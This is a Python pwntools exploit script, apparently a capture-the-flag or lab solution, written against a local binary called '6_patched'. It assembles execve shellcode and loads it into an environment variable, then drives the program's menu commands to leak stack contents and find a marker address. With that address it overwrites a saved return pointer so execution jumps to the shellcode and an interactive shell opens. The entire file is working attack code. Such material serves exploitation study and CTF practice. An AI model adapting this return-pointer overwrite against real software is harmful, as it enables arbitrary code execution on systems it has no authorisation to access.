#!/usr/bin/env python3

from pwn import *

exe = ELF("./6_patched")

context.binary = exe
shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
print(shellcode)
shellcode = asm(shellcode)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="b *0x7fffffffe5e8")
    else:
        r = remote("addr", 1337)

    return r

def case_c(r, index,value):
    r.recvuntil(b"> ")
    r.sendline(b"c " + index + b"=" + value)

def case_e(r, index,value):
    r.recvuntil(b"> ")
    r.sendline(b"e " + index + b"=" + value)

def case_f(r):
    r.recvuntil(b"> ")
    r.sendline(b"f")

def case_a(r, index):
    r.recvuntil(b"> ")
    r.sendline(b"a " + index)

def case_q(r):
    r.recvuntil(b"> ")
    r.sendline(b"q")

def main():
    with open("shellcode_full", "wb") as f:
        f.write(b"\xbb"*40 + shellcode + b"\xbb"*40)
    print('export SHELLCODE="$(cat shellcode_full)"')
    print(shellcode)
    global Stack_addr
    r = conn()
    # Stack start
    case_e(r, b"6", b"A"*32)

    # Loop through the stack
    for i in range(0x007ffffffde000,0x007ffffffff000,8):
        case_c(r, b"7", bytes(str(int(i)), "utf-8"))
        case_a(r, b"1")
        case_a(r, b"7")
        case_e(r, b"6", bytes(str(int(i)), "utf-8"))
        case_f(r)
        r.recvuntil(b"Salt (")
        leak = r.recvuntil(b")", drop=True)[:8]
        addr = int.from_bytes(leak, "little")
        #print(hex(addr) + " Found at " + hex(i))
        if addr == 0x0041414141414141:
            print("Found Addr", hex(i))
            Stack_addr = i
            break
            

    # use the found address
    print("Stack_addr:", hex(Stack_addr))
    offset = 0x7fffffffdcc8 - 0x7fffffffdb78
    print("Offsets:", hex(offset))
    Shellcode_addr = 0x7fffffffe0c5
    
    # overwriting shellcode
    print("Found Ret ptr at " + hex(Stack_addr + offset))
    case_c(r, b"7", bytes(str(int(offset + Stack_addr)), "utf-8"))
    case_e(r, b"7", p64(Shellcode_addr))
    sleep(3)
    case_q(r)

    r.interactive()



if __name__ == "__main__":
    main()
